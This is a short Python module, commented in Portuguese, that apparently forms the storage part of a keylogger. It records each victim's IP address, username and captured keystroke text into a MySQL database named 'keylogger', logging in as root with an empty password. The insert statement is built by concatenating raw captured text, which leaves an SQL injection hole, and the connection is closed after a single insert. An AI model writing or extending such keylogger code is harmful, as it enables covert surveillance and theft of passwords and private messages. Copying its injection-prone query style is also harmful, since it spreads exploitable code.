import pymysql
import ip

class Database:

    def __init__(self):
        # Abrimos uma conexão com o banco de dados:
        self.conexao = pymysql.connect(db='keylogger', user='root', passwd='')
        # Cria um cursor:
        self.cursor = self.conexao.cursor()

        _ip = ip.Ip()
        self.getIP = _ip.get_ip()
        self.getUser = _ip.get_user()
    
    def insert(self, log):
        # Executa o comando:
        self.cursor.execute("INSERT INTO dados (ip, user, texto) VALUES ('" + self.getIP + "','" + self.getUser + "','" + log + "')")
        
        # Efetua um commit no banco de dados.
        # Por padrão, não é efetuado commit automaticamente. Você deve commitar para salvar
        # suas alterações.
        self.conexao.commit()
        
        # Finaliza a conexão
        self.conexao.close()
